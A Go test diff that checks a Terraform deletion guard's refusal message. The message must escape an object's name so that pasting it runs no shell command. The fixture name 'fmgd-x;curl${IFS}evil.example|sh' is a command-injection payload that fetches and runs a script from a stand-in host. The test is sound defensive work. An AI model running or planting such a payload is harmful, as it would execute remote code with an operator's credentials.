@@ -1814,6 +1814,44 @@ func TestManagedCoverRefusesAListedDeleteOfALockedResource(t *testing.T) {
 	}
 }
 
+// TestManagedCoverRefusalOfAShellCommandNameIsPasteable: the refusal an
+// unlisted removal draws prints the identity of the object the plan removes,
+// for its reader to copy into fugaro allow-delete — and the object's own name
+// is the plan's, not this program's. The name rule (managedName) does not
+// reach this one: for a bucket object the attribute managedNames names is the
+// BUCKET, so the object's own name is read out of the before view as it
+// stands. A plan carrying "fmgd-x;curl${IFS}evil.example|sh" there is a plan
+// whose refusal would otherwise hand its reader a command line to paste, with
+// the operator's credentials, so this pins the end the identity's escaping is
+// for: the sentence holds no byte a shell reads (tf.identityValue,
+// TestAnIdentityHoldsNoByteAShellWouldRead for the encoder itself).
+func TestManagedCoverRefusalOfAShellCommandNameIsPasteable(t *testing.T) {
+	rc := destroyed(managedKeptFixture["google_storage_bucket_object"])
+	rc.Change.Before = map[string]any{
+		"bucket": ManagedPrefix + "bucket", "name": `fmgd-x;curl${IFS}evil.example|sh`,
+		"id": ManagedPrefix + "bucket/x", "project": "proj-1", "generation": float64(1758000000000000)}
+	out := managedTestCover().NotCovered(managedPlan(rc), nil)
+	if len(out) != 1 {
+		t.Fatalf("an unlisted delete of a bucket object gives %q, want one refusal", out)
+	}
+	// The identity the sentence prints, copied the way its reader copies it:
+	// what follows the sentence's own words, up to the bracket that closes its
+	// parenthetical. The sentence's own text is not part of it — it is this
+	// program's, and it holds an apostrophe of its own.
+	const mark = "(the plan removes "
+	i := strings.Index(out[0], mark)
+	if i < 0 {
+		t.Fatalf("the refusal does not name the object the plan removes:\n%s", out[0])
+	}
+	printed := strings.TrimSuffix(out[0][i+len(mark):], ")")
+	if strings.ContainsAny(printed, ";|&$`{}[]*?!~'\"") {
+		t.Errorf("the refusal prints the plan's own name raw, so a reader pasting it runs a command:\n%s", printed)
+	}
+	if !strings.Contains(printed, `fmgd-x\x3bcurl\x24\x7bIFS\x7devil.example\x7csh`) {
+		t.Errorf("the refusal does not carry the name as the identity escapes it:\n%s", printed)
+	}
+}
+
 // TestManagedCoverReplacesAreJudgedLikeDeletes: both of terraform's action
 // orders, and both halves — the resource the plan removes and the one it
 // creates. A replace of a listed address is refused when either half is not
